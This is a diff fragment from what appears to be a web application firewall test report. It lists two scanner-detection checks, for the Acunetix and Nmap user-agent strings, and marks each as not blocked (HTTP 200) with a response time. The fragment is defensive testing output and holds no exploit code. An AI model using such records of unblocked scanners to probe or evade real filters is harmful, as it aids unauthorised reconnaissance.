+  Category: scanner-detection
+  Payload: Acunetix
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.227s
+
+Test: Scanner: Nmap scanner UA
+  Category: scanner-detection
+  Payload: Nmap
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.196s
